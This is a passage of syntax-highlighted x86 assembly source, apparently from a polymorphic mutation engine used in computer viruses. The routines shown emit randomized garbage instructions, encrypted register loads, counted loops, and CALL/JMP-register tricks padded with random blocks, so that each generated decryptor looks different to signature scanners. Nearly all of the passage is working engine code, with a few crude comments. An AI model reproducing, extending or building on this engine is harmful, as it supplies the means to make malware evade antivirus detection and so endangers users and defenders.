        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;loop has two bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">         </span><span class="sc1">;loop identification</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; enable ECX</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">11111101b</span><span class="sc0">
</span><span class="sc5">a_loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate reg + garbage + dec reg + jnz reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc5">g_lj_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=8bit, 1=16bit, 2=32bit</span><span class="sc0">
        </span><span class="sc5">g_lj_reg_past</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=low, 1=high (8BIT only)</span><span class="sc0">

</span><span class="sc5">g_loop_jump</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; we can't be recursived because ECX is only for one LOOP_JUMP</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_loop_jump</span><span class="sc0">

        </span><span class="sc1">; select a free register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;8 bit ...</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__g_lj_no_8bit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">               </span><span class="sc1">;hi, lo ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg_past</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__g_lj_okay</span><span class="sc0">

        </span><span class="sc1">; choose between reg16 and reg32</span><span class="sc0">
    </span><span class="sc5">__g_lj_no_8bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;reg16 or reg32 ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc5">__g_lj_okay</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000030h</span><span class="sc0">       </span><span class="sc1">;how many to looping ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;used reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;disable register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4866h</span><span class="sc0">        </span><span class="sc1">;dec (reg16-clone)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__g_lj_dec_8bit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__g_lj_dec_32bit</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">__g_lj_dec_32bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__g_lj_dec_finish</span><span class="sc0">
    </span><span class="sc5">__g_lj_dec_8bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C8FEh</span><span class="sc0">       </span><span class="sc1">;dec (reg8)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;certain reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_lj_reg_past</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__g_lj_dec_8bit_high</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__g_lj_dec_finish</span><span class="sc0">
    </span><span class="sc5">__g_lj_dec_8bit_high</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc5">__g_lj_dec_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;certain reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ identification</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">a_loop_jump</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate reg32 + call reg32 + rnd_block + pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate CALL reg32 which will be gene-</span><span class="sc0">
        </span><span class="sc1">;rated by &lt;ppe_crypt_value&gt;.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">g_cr32_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">g_cr32_full</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=g_return,1=call,2=jump</span><span class="sc0">
        </span><span class="sc5">g_cr32_jump</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;address of CALL instruction</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_call_reg32</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">b_call_reg32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; test, if global index reg is generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_call_reg32</span><span class="sc0">

        </span><span class="sc1">; do not recursived - because it's few registers</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_call_reg32</span><span class="sc0">

        </span><span class="sc1">; garbage only in main-poly loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_call_reg32</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; select an empty register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc1">; calculate size of rnd_block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000030h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">       </span><span class="sc1">;damn, fucking BUG !!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;save it for later use</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">d_call_reg32</span><span class="sc0">
</span><span class="sc5">c_call_reg32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">d_call_reg32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">     </span><span class="sc1">;ebx is full</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;uaaahh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">   </span><span class="sc1">; + global index register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; for &lt;ppe_get_return&gt; we don't want to set right size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">e_call_reg32</span><span class="sc0">

        </span><span class="sc1">; set the right size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">         </span><span class="sc1">; + call reg32 + (add/sub)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cr32_add</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">       </span><span class="sc1">;sub reg32,imm32 id</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cr32_finish</span><span class="sc0">
    </span><span class="sc5">__cr32_add</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">       </span><span class="sc1">;add reg32,imm32 id</span><span class="sc0">
    </span><span class="sc5">__cr32_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">e_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; now, write CALL reg32 instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D0FFh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">f_call_reg32</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;rnd_block length</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_fill</span><span class="sc0">    </span><span class="sc1">;ecx is full</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">f_call_reg32</span><span class="sc0">

        </span><span class="sc1">; and we must put value from stack via POP reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;uaaahh...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">f_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; restore used_regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">a_call_reg32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate reg32 + jump reg32 + rnd_block ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_jump_reg32</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">

        </span><span class="sc1">; write CALL reg32 garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">b_call_reg32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_jump_reg32</span><span class="sc0">

        </span><span class="sc1">; rewrite CALL reg32 --&gt; JMP reg32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">;CALL reg32 -&gt; JMP reg32</span><span class="sc0">

</span><span class="sc5">a_jump_reg32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate rep/repnz + cmps/lods/stos/scas/movs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Welcome to my popular function. I think  any  comment  is</span><span class="sc0">
        </span><span class="sc1">;needless - because this  function is easy  to understand.</span><span class="sc0">
